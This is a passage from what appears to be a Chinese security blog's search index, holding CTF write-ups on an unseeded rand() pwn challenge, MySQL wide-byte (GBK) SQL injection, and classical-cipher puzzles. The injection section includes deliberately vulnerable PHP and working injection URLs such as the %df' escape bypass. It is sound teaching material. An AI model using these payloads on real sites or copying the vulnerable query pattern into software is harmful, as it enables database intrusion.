class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">*****************************rand()函数********************************</span><br><span class="line">函数原型：int rand(void)；</span><br><span class="line">返回值：返回一个[0，RAND_MAX]之间的随机整数</span><br><span class="line">说明：rand()函数产生的随机数并不是真正的随机数，是伪随机数，它会将srand()产生</span><br><span class="line">     的随机数种子作为随机数序列的初始值。如果每次的种子不同，就可以产生不同的随</span><br><span class="line">     机数序列。如果种子是相同的，产生的随机数序列也是相同的。若未设置随机数种子，</span><br><span class="line">     默认是随机数种子为1，这里就是这种情况</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">****************************srand()函数********************************</span><br><span class="line">函数原型：void srand(unsigned seed)；</span><br><span class="line">函数参数：参数seed就是设置的随机数种子</span><br><span class="line">说明：系统在调用rand()函数之前，会自动调用srand()，如果用户在rand()之前曾调用</span><br><span class="line">     过srand()给参数seed指定了一个值，那么 rand()就会将seed的值作为产生伪随机</span><br><span class="line">     数的初始值；而如果用户在rand()前没有调用过srand()，那么系统默认将1作为伪</span><br><span class="line">     随机数的初始 值。如果给了一个定值，那么每次rand()产生的随机数序列都是一样的~~</span><br></pre></td></tr></table></figure><p>我们可以看到，random.c里用了<code>rand()</code>函数，但是没有对随机数种子进行设置，所以，每次运行这个程序的时候，产生的第一个随机数都是确定的。可以有好几种方法获得这个序列的第一个随机值，可以写一段代码将第一个随机数打印出来，也可以用调试器调试，看执行完rand()函数后，<code>rax</code>或者<code>eax</code>内的值，就是rand()函数的返回值.我用gdb查看rax的值，先在rand()函数后下一个断点，运行到断点出，可以看到rax的值如下图所示：(0x6b8b4567==1804289383)</p><div align="left"><br>    <img src="/resources/2018/2018-04-28-01.png" alt="gdb"><br></div><h4 id="0x02-获取flag"><a href="#0x02-获取flag" class="headerlink" title="0x02 获取flag"></a>0x02 获取flag</h4><blockquote><ul><li>当<code>if((key ^ random) == 0xdeadbeef)</code>成立时，会将flag显示出来</li><li>random在上面已经得到了，<code>random=0x6b8b4567</code></li><li>key是我们需要输入的，我们知道^(异或)运算是<code>可逆</code>的</li><li>所以key=random^0xdeadbeef,<code>key=3039230856</code></li></ul></blockquote><div align="left"><br>    <img src="/resources/2018/2018-04-28-02.png" alt="flag"><br></div><h4 id="0x03-总结-1"><a href="#0x03-总结-1" class="headerlink" title="0x03 总结"></a>0x03 总结</h4><p>这道题的知识点是<code>rand()</code>函数，如果未用<code>srand()</code>设置随机数种子，则默认随机数种子为1，产生的随机数序列是确定的</p><h2 id="Rookiss"><a href="#Rookiss" class="headerlink" title="[Rookiss]"></a>[Rookiss]</h2><h2 id="Grotesque"><a href="#Grotesque" class="headerlink" title="[Grotesque]"></a>[Grotesque]</h2><h2 id="Hacker’s-Secret"><a href="#Hacker’s-Secret" class="headerlink" title="[Hacker’s Secret]"></a>[Hacker’s Secret]</h2>]]></content>
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>MySQL宽字节注入</title>
      <link href="/2018/01/27/MySQL%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/"/>
      <url>/2018/01/27/MySQL%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/</url>
      <content type="html"><![CDATA[<blockquote><p>今天做了一道CTF题目，关于MySQL宽字节注入的问题。这是一个由字符编码引起的漏洞，话不多说，进入分析。<br><a id="more"></a></p></blockquote><h3 id="0x00-经典的SQL注入漏洞"><a href="#0x00-经典的SQL注入漏洞" class="headerlink" title="0x00 经典的SQL注入漏洞"></a>0x00 经典的SQL注入漏洞</h3><blockquote><p>这是没有任何SQL注入防护措施的PHP程序，它存在SQL注入漏洞。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">  $name=$_GET[<span class="string">'name'</span>];  </span><br><span class="line">  $conn=mysql_connect(<span class="string">'localhost'</span>,<span class="string">'root'</span>,<span class="string">'root'</span>);  </span><br><span class="line">  <span class="keyword">if</span>($conn==<span class="keyword">null</span>)&#123;<span class="keyword">exit</span>(<span class="string">"connect error !&lt;br&gt;"</span>);&#125;  </span><br><span class="line">  mysql_select_db(<span class="string">"aaa"</span>,$conn);  </span><br><span class="line">  $sql=<span class="string">"select * from a1 where name='"</span>.$name.<span class="string">"'"</span>;  </span><br><span class="line">  $result=mysql_query($sql,$conn);  </span><br><span class="line">  <span class="keyword">while</span>($val=mysql_fetch_row($result))&#123;  </span><br><span class="line">      print_r($val);  </span><br><span class="line">      <span class="keyword">print</span>(<span class="string">"&lt;br&gt;"</span>);  </span><br><span class="line">  &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>对该PHP程序的SQL注入POC包括：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?name=a&apos;or &apos;a&apos;=&apos;a</span><br><span class="line">http://127.0.0.1/test.php?name=a&apos;or 1=1 -- %20</span><br><span class="line">http://127.0.0.1/test.php?name=a&apos;or 1=1 -- %23</span><br></pre></td></tr></table></figure><p>其中，%20对应空格，%23对应#的URL编码，该POC在PHP5.4.45+Apache测试成功。</p><h3 id="0x01-安全过滤"><a href="#0x01-安全过滤" class="headerlink" title="0x01 安全过滤"></a>0x01 安全过滤</h3><p>如果对上面例子1中的PHP程序中的$name变量进行安全过滤，如使用下列转义函数，则对应的POC全部失效了。</p><blockquote><p>(1)addslashes<br>(2)mysql_real_escape_string<br>(3)mysql_escape_string</p></blockquote><p>转义函数影响的字符包括：</p><ul><li>(1) ASCII(NULL))字符\x00</li><li>(2) 换行字符\n，addslashes不转义</li><li>(3) 回车字符\r，addslashes不转义</li><li>(4) 反斜杠字符\</li><li>(5) 单引号字符‘</li><li>(6) 双引号字符“</li><li>(7) \x1a，addslashes不转义</li></ul><p>对于例子1进行安全增强后，得到例子2，如下所示。<br>注意：三个转义函数的功能稍有区别，同时，转义只对字符型SQL注入防范有效，对于数值型SQL注入无效。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$name=$_GET[<span class="string">'name'</span>];  </span><br><span class="line"><span class="comment">//$name=addslashes($name);  </span></span><br><span class="line"><span class="comment">//$name=mysql_escape_string($name);  </span></span><br><span class="line">$conn=mysql_connect(<span class="string">'localhost'</span>,<span class="string">'root'</span>,<span class="string">'root'</span>);  </span><br><span class="line">$name=mysql_real_escape_string($name);  </span><br><span class="line"><span class="keyword">if</span>($conn==<span class="keyword">null</span>)&#123;<span class="keyword">exit</span>(<span class="string">"connect error !&lt;br&gt;"</span>);&#125;  </span><br><span class="line">mysql_select_db(<span class="string">"aaa"</span>,$conn);  </span><br><span class="line">$sql=<span class="string">"select * from a1 where name='"</span>.$name.<span class="string">"'"</span>;  </span><br><span class="line">$result=mysql_query($sql,$conn);  </span><br><span class="line"><span class="keyword">while</span>($val=mysql_fetch_row($result))&#123;  </span><br><span class="line">    print_r($val);  </span><br><span class="line">    <span class="keyword">print</span>(<span class="string">"&lt;br&gt;"</span>);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="0x02-宽字节注入漏洞原理"><a href="#0x02-宽字节注入漏洞原理" class="headerlink" title="0x02 宽字节注入漏洞原理"></a>0x02 宽字节注入漏洞原理</h3><p>宽字符是指两个字节宽度的编码技术，如UNICODE、GBK、BIG5等。当MYSQL数据库数据在处理和存储过程中，涉及到的字符集相关信息包括：</p><blockquote><p>(1) character_set_client:客户端发送过来的SQL语句编码，也就是PHP发送的SQL查询语句编码字符集。<br>(2) character_set_connection:MySQL服务器接收客户端SQL查询语句后，在实施真正查询之前SQL查询语句编码字符集。<br>(3) character_set_database:数据库缺省编码字符集。<br>(4) character_set_filesystem:文件系统编码字符集。<br>(5) character_set_results:SQL语句执行结果编码字符集。<br>(6) character_set_server:服务器缺省编码字符集。<br>(7) character_set_system:系统缺省编码字符集。<br>(8) character_sets_dir:字符集存放目录，一般不要修改。</p></blockquote><p>宽字节对转义字符的影响发生在character_set_client=gbk的情况，也就是说，如果客户端发送的数据字符集是gbk，则可能会吃掉转义字符\，从而导致转义消毒失败。例子3就是一个存在宽字符注入漏洞的PHP程序。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$name=$_GET[<span class="string">'name'</span>];  </span><br><span class="line">$name=addslashes($name);  </span><br><span class="line">$conn=mysql_connect(<span class="string">'localhost'</span>,<span class="string">'root'</span>,<span class="string">'root'</span>);  </span><br><span class="line"><span class="keyword">if</span>($conn==<span class="keyword">null</span>)&#123;<span class="keyword">exit</span>(<span class="string">"connect error !&lt;br&gt;"</span>);&#125;  </span><br><span class="line">mysql_query(<span class="string">"SET NAMES 'gbk'"</span>,$conn);  </span><br><span class="line">mysql_select_db(<span class="string">"aaa"</span>,$conn);  </span><br><span class="line">$sql=<span class="string">"select * from a1 where name='"</span>.$name.<span class="string">"'"</span>;  </span><br><span class="line">$result=mysql_query($sql,$conn);  </span><br><span class="line"><span class="keyword">while</span>($val=mysql_fetch_row($result))&#123;  </span><br><span class="line">    print_r($val);  </span><br><span class="line">    <span class="keyword">print</span>(<span class="string">"&lt;br&gt;"</span>);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这个PHP程序的SQL注入POC为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test/t3.php?name=a%df&apos; or 1=1; %20%23</span><br></pre></td></tr></table></figure></p><p>其原理是mysql_query(“SETNAMES ‘gbk’”,$conn)语句将编码字符集修改为gbk，此时，%df\’对应的编码就是%df%5c’，即汉字“運’”，这样单引号之前的转义符号“\”就被吃调了，从而转义消毒失败</p><h3 id="0x04-宽字节注入漏洞再深入"><a href="#0x04-宽字节注入漏洞再深入" class="headerlink" title="0x04 宽字节注入漏洞再深入"></a>0x04 宽字节注入漏洞再深入</h3><p>从宽字节注入漏洞原理可以看出，宽字节注入的关键点有两个：</p><blockquote><p>(1) 设置宽字节字符集；<br>(2) 设置的宽字符集可能吃掉转义符号“\”（对应的编码为0x5c，即低位中包含正常的0x5c就行了）。</p></blockquote><p>理论上，符合第二条的字符集都可能导致宽字节注入漏洞，这里以gbk字符集为典型，介绍宽字符注入漏洞典型案例。<br>宽字节注入漏洞的另一个关键是设置了character_set_client为宽字节字符集，这里有很多中设置的方式，主要包括隐式设置和显式设置。<br>隐含方式设置是指charcter_set_client缺省字符集就是宽字节字符集。<br>显式设置是指在PHP程序中调用相应的设置函数来实现字符集的设置或直接对字符串进行编码转换，设置的函数包括：</p><p>(1) mysql_query，如mysql_query(“SET NAMES ‘gbk’”, $conn)、mysql_query(“setcharacter_set_client = gbk”, $conn)。<br>(2) mysql_set_charset，如mysql_set_charset(“gbk”,$conn)。<br>(3) mb_convert_encoding，如mb_convert_encoding($sql,”utf8”,”gbk”)，将SQL语句从gbk格式转换为utf8格式时，0x5c被吃掉了。<br>(4) iconv，如iconv(‘GBK’, ‘UTF-8’,$sql)，原理同上。</p><p><a href="http://blog.csdn.net/helloweb2014/article/details/60757497" target="_blank" rel="noopener">原文链接</a></p>]]></content>
      
      <categories>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>实验吧WriteUp合集</title>
      <link href="/2018/01/15/%E5%AE%9E%E9%AA%8C%E5%90%A7Wirteup%E5%90%88%E9%9B%86/"/>
      <url>/2018/01/15/%E5%AE%9E%E9%AA%8C%E5%90%A7Wirteup%E5%90%88%E9%9B%86/</url>
      <content type="html"><![CDATA[<blockquote><p>本篇博客主要用来记录在实验吧上做的题目的步骤，和一些在做题过程中的体会。此篇博客会持续更新！<br><a id="more"></a></p></blockquote><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h2 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h2><h3 id="传统知识-古典密码"><a href="#传统知识-古典密码" class="headerlink" title="传统知识+古典密码"></a>传统知识+古典密码</h3><blockquote><ol><li><strong>题目链接:</strong> <a href="http://www.shiyanbar.com/ctf/1991" target="_blank" rel="noopener">http://www.shiyanbar.com/ctf/1991</a></li><li><strong>题目描述:</strong><br> &emsp;&emsp;小明某一天收到一封密信，信中写了几个不同的年份辛卯，癸巳，丙戌，辛未，庚辰，癸酉，己卯，癸巳。信的背面还写有“+甲子”，请解出这段密文。</li></ol></blockquote><h4 id="0x00-题目分析"><a href="#0x00-题目分析" class="headerlink" title="0x00 题目分析"></a>0x00 题目分析</h4><p>&emsp;&emsp;通过题目名称和描述可知,这是一个与六十甲子有关的题目(传统知识)，并且用到了古典加密。一般这种题应该首先按照题目所给顺序得到六十甲子序号序列。</p><h4 id="0x01-对照六十甲子表"><a href="#0x01-对照六十甲子表" class="headerlink" title="0x01 对照六十甲子表"></a>0x01 对照六十甲子表</h4><div align="center"><br>    <img src="/resources/2018/2018-01-15-00.png" alt="六十甲子顺序表"><br></div><table><thead><tr><th style="text-align:center">辛卯</th><th style="text-align:center">癸巳</th><th style="text-align:center">丙戌</th><th style="text-align:center">辛未</th><th style="text-align:center">庚辰</th><th style="text-align:center">癸酉</th><th style="text-align:center">己卯</th><th style="text-align:center">癸巳</th></tr></thead><tbody><tr><td style="text-align:center">28</td><td style="text-align:center">30</td><td style="text-align:center">23</td><td style="text-align:center">08</td><td style="text-align:center">17</td><td style="text-align:center">10</td><td style="text-align:center">16</td><td style="text-align:center">30</td></tr></tbody></table><h4 id="0x02-“-甲子”"><a href="#0x02-“-甲子”" class="headerlink" title="0x02 “+甲子”"></a>0x02 “+甲子”</h4><p>&emsp;&emsp;这句话的意思是给其序列的每一个序号加一个”甲子”，也就是60年。</p><table><thead><tr><th style="text-align:center">辛卯</th><th style="text-align:center">癸巳</th><th style="text-align:center">丙戌</th><th style="text-align:center">辛未</th><th style="text-align:center">庚辰</th><th style="text-align:center">癸酉</th><th style="text-align:center">己卯</th><th style="text-align:center">癸巳</th></tr></thead><tbody><tr><td style="text-align:center">28</td><td style="text-align:center">30</td><td style="text-align:center">23</td><td style="text-align:center">08</td><td style="text-align:center">17</td><td style="text-align:center">10</td><td style="text-align:center">16</td><td style="text-align:center">30</td></tr><tr><td style="text-align:center">88</td><td style="text-align:center">90</td><td style="text-align:center">83</td><td style="text-align:center">68</td><td style="text-align:center">77</td><td style="text-align:center">70</td><td style="text-align:center">76</td><td style="text-align:center">90</td></tr></tbody></table><p>&emsp;&emsp;但是呢，得到这组数又有啥用呢，古典密码学有的只是一串字符啊，咱们可以想想，数字和字符怎么有对应关系呢？于是我们可以想到ASCII</p><table><thead><tr><th style="text-align:center">辛卯</th><th style="text-align:center">癸巳</th><th style="text-align:center">丙戌</th><th style="text-align:center">辛未</th><th style="text-align:center">庚辰</th><th style="text-align:center">癸酉</th><th style="text-align:center">己卯</th><th style="text-align:center">癸巳</th></tr></thead><tbody><tr><td style="text-align:center">28</td><td style="text-align:center">30</td><td style="text-align:center">23</td><td style="text-align:center">08</td><td style="text-align:center">17</td><td style="text-align:center">10</td><td style="text-align:center">16</td><td style="text-align:center">30</td></tr><tr><td style="text-align:center">88</td><td style="text-align:center">90</td><td style="text-align:center">83</td><td style="text-align:center">68</td><td style="text-align:center">77</td><td style="text-align:center">70</td><td style="text-align:center">76</td><td style="text-align:center">90</td></tr><tr><td style="text-align:center">X</td><td style="text-align:center">Z</td><td style="text-align:center">S</td><td style="text-align:center">D</td><td style="text-align:center">M</td><td style="text-align:center">F</td><td style="text-align:center">L</td><td style="text-align:center">Z</td></tr></tbody></table><h4 id="0x03-解密"><a href="#0x03-解密" class="headerlink" title="0x03 解密"></a>0x03 解密</h4><p><strong>XZSDMFLZ</strong>得到这么一串字符，可是好像没啥规律啊，用<a href="https://github.com/0Chencc/CTFCrackTools-V2" target="_blank" rel="noopener">CTFCrackTools</a>先尝试一下栅栏解密，得到如下结果<br>&emsp;&emsp;得到因数(排除1和字符串长度):<br>&emsp;&emsp;2 4<br>&emsp;&emsp;第1栏：XSMLZDFZ<br>&emsp;&emsp;第2栏：XMZFSLDZ<br>继续用得到的两个字符串分别进行凯撒解密，发现第二个字符串解得的字符串中有一个是有规律的</p><div align="center"><br>    <img src="/resources/2018/2018-01-15-01.png" alt="最后结果"><br></div><h4 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h4><p>&emsp;&emsp;此题首先将flag进行凯撒加密，然后又用栅栏加密，将得到的密文中选择了一个进行字符-&gt;ASCII(对应的10进制),又将每项减去60，产生六十甲子序列的序号序列，再转换成六十甲子序列。</p><h3 id="try-them-all"><a href="#try-them-all" class="headerlink" title="try them all"></a>try them all</h3><blockquote><ol><li><strong>题目链接:</strong> <a href="http://www.shiyanbar.com/ctf/1981" target="_blank" rel="noopener">http://www.shiyanbar.com/ctf/1981</a></li><li><strong>题目描述:</strong><br> &emsp;&emsp;You have found a passwd file containing salted passwords. An unprotected configuration file has revealed a salt of 5948. The hashed password for the ‘admin’ user appears to be 81bdf501ef206ae7d3b92070196f7e98, try to brute force this password.</li></ol></blockquote><h4 id="0x00-翻译-毕竟英语差，顺便学习学习英语"><a href="#0x00-翻译-毕竟英语差，顺便学习学习英语" class="headerlink" title="0x00 翻译(毕竟英语差，顺便学习学习英语)"></a>0x00 翻译(毕竟英语差，顺便学习学习英语)</h4><p>&emsp;&emsp;大意是:你发现了一个包含了加盐密码的密码文件。一个不受保护的配置文件透漏了这个加盐密码为<strong>5948</strong>，用户“admin”的密码的hash值是<strong>81bdf501ef206ae7d3b92070196f7e98</strong>，尝试用暴力破解破解此密码。</p><h4 id="0x01-解密"><a href="#0x01-解密" class="headerlink" title="0x01 解密"></a>0x01 解密</h4><p>&emsp;&emsp;看样子是MD5加密，拿到<a href="http://www.chamd5.org/" target="_blank" rel="noopener">ChaMD5</a>解密(用的是MD5-32加密的)，得到明文<strong>sniper5948</strong>。题目说用了salt加密，并且加盐密码是<strong>5948</strong>，将它去了就是“admin”用户的密码。</p><h3 id="trivial"><a href="#trivial" class="headerlink" title="trivial"></a>trivial</h3><blockquote><ol><li><strong>题目链接:</strong> <a href="http://www.shiyanbar.com/ctf/1980" target="_blank" rel="noopener">http://www.shiyanbar.com/ctf/1980</a></li><li><strong>题目描述:</strong><br> An unlocked terminal is displaying the following:<br> Encryption complete, ENC(???,T0pS3cre7key) = Bot kmws mikferuigmzf rmfrxrwqe abs perudsf! Nvm kda ut ab8bv_w4ue0_ab8v_DDU<br> <a href="http://ctf5.shiyanbar.com/crypto/trivial/encrypt.rar" target="_blank" rel="noopener">You poke around and find this interesting file.</a></li></ol></blockquote><h4 id="0x00-翻译"><a href="#0x00-翻译" class="headerlink" title="0x00 翻译"></a>0x00 翻译</h4><p>&emsp;&emsp;大意是:一个未锁的终端显示了如下的信息。<br>&emsp;&emsp;加密完成，<strong>ENC(???,T0pS3cre7key) = Bot kmws mikferuigmzf rmfrxrwqe abs perudsf! Nvm kda ut ab8bv_w4ue0_ab8v_DDU</strong></p><h4 id="0x01-题目分析"><a href="#0x01-题目分析" class="headerlink" title="0x01 题目分析"></a>0x01 题目分析</h4><p>&emsp;&emsp;可以在上面链接中得到一个压缩包，里面有一个名为<strong>encrypt.py</strong>的python源文件，先来测试一下其功能：</p><div align="center"><br>    <img src="/resources/2018/2018-01-15-02.png" alt="测试功能"><br></div><p><strong>encrypt.py</strong>源码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">alphaL = <span class="string">"abcdefghijklnmopqrstuvqxyz"</span></span><br><span class="line">alphaU = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVQXYZ"</span></span><br><span class="line">num    = <span class="string">"0123456789"</span></span><br><span class="line">keychars = num+alphaL+alphaU</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) != <span class="number">3</span>:</span><br><span class="line">  <span class="keyword">print</span> <span class="string">"Usage: %s SECRET_KEY PLAINTEXT"</span>%(sys.argv[<span class="number">0</span>])  </span><br><span class="line">  sys.exit() </span><br><span class="line"></span><br><span class="line">key = sys.argv[<span class="number">1</span>] </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> key.isalnum(): </span><br><span class="line">  <span class="keyword">print</span> <span class="string">"Your key is invalid, it may only be alphanumeric characters"</span>   </span><br><span class="line">  sys.exit()   </span><br><span class="line"></span><br><span class="line">plaintext = sys.argv[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">ciphertext = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(plaintext)): </span><br><span class="line">  rotate_amount = keychars.index(key[i%len(key)])   </span><br><span class="line">  <span class="keyword">if</span> plaintext[i] <span class="keyword">in</span> alphaL:  </span><br><span class="line">    enc_char = ord(<span class="string">'a'</span>) + (ord(plaintext[i])-ord(<span class="string">'a'</span>)+rotate_amount)%<span class="number">26</span></span><br><span class="line">  <span class="keyword">elif</span> plaintext[i] <span class="keyword">in</span> alphaU: </span><br><span class="line">    enc_char = ord(<span class="string">'A'</span>) + (ord(plaintext[i])-ord(<span class="string">'A'</span>)+rotate_amount)%<span class="number">26</span></span><br><span class="line">  <span class="keyword">elif</span> plaintext[i] <span class="keyword">in</span> num:   </span><br><span class="line">    enc_char = ord(<span class="string">'0'</span>) + (ord(plaintext[i])-ord(<span class="string">'0'</span>)+rotate_amount)%<span class="number">10</span></span><br><span class="line">  <span class="keyword">else</span>:                  </span><br><span class="line">    enc_char = ord(plaintext[i])</span><br><span class="line">  ciphertext = ciphertext + chr(enc_char)   </span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Encryption complete, ENC(%s,%s) = %s"</span>%(plaintext,key,ciphertext)</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;经过测试功能，可以分析出源码是怎样对明文进行加密的。<strong>encrypt.py SECRET_KEY PLAINTEXT</strong>(第一个参数是加密文件名，第二个参数是密钥，第三个参数是明文)。<strong>Encryption complete, ENC(mkks,123a) = nmnc</strong>(mkks是明文，123a是密钥，nmnc是密文)。所以根据题目现在知道了密文和密钥，让我们求明文。可以根据加密算法写一段解密的代码(代码是借鉴别人的，本人现在还小白一个)。</p><p>假设pla是b，key是a（即rotate_amount为10），那么根据源代码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">enc_char = ord(<span class="string">'a'</span>) + (ord(plaintext[i])-ord(<span class="string">'a'</span>)+rotate_amount)%<span class="number">26</span></span><br></pre></td></tr></table></figure></p><p>算出来chr(enc_char)为l。换句话来说，从密文换到原文也就是：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">enc_char = ord(<span class="string">'a'</span>) + (ord(ciphertext[i])-ord(<span class="string">'a'</span>)-rotate_amount)%<span class="number">26</span></span><br></pre></td></tr></table></figure></p><p>把加号换成减号就行。</p><h4 id="0x02-编写解密代码"><a href="#0x02-编写解密代码" class="headerlink" title="0x02 编写解密代码"></a>0x02 编写解密代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">alphaL = <span class="string">"abcdefghijklnmopqrstuvqxyz"</span></span><br><span class="line">alphaU = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVQXYZ"</span></span><br><span class="line">num    = <span class="string">"0123456789"</span></span><br><span class="line">keychars = num+alphaL+alphaU</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = <span class="string">'T0pS3cre7key'</span></span><br><span class="line"></span><br><span class="line">plaintext = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">ciphertext = <span class="string">"Bot kmws mikferuigmzf rmfrxrwqe abs perudsf! Nvm kda ut ab8bv_w4ue0_ab8v_DDU"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(ciphertext)):</span><br><span class="line">  rotate_amount = keychars.index(key[i%len(key)])</span><br><span class="line">  <span class="keyword">if</span> ciphertext[i] <span class="keyword">in</span> alphaL:</span><br><span class="line">    enc_char = ord(<span class="string">'a'</span>) + (ord(ciphertext[i])-ord(<span class="string">'a'</span>)-rotate_amount)%<span class="number">26</span></span><br><span class="line">  <span class="keyword">elif</span> ciphertext[i] <span class="keyword">in</span> alphaU:</span><br><span class="line">    enc_char = ord(<span class="string">'A'</span>) + (ord(ciphertext[i])-ord(<span class="string">'A'</span>)-rotate_amount)%<span class="number">26</span></span><br><span class="line">  <span class="keyword">elif</span> ciphertext[i] <span class="keyword">in</span> num:</span><br><span class="line">    enc_char = ord(<span class="string">'0'</span>) + (ord(ciphertext[i])-ord(<span class="string">'0'</span>)-rotate_amount)%<span class="number">10</span></span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    enc_char = ord(ciphertext[i])</span><br><span class="line">  plaintext = plaintext + chr(enc_char)</span><br><span class="line"></span><br><span class="line">print(plaintext)</span><br></pre></td></tr></table></figure><h2 id="安全杂项"><a href="#安全杂项" class="headerlink" title="安全杂项"></a>安全杂项</h2><h2 id="逆向工程"><a href="#逆向工程" class="headerlink" title="逆向工程"></a>逆向工程</h2><h2 id="隐写术"><a href="#隐写术" class="headerlink" title="隐写术"></a>隐写术</h2><h2 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h2><h2 id="溢出"><a href="#溢出" class="headerlink" title="溢出"></a>溢出</h2>]]></content>
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
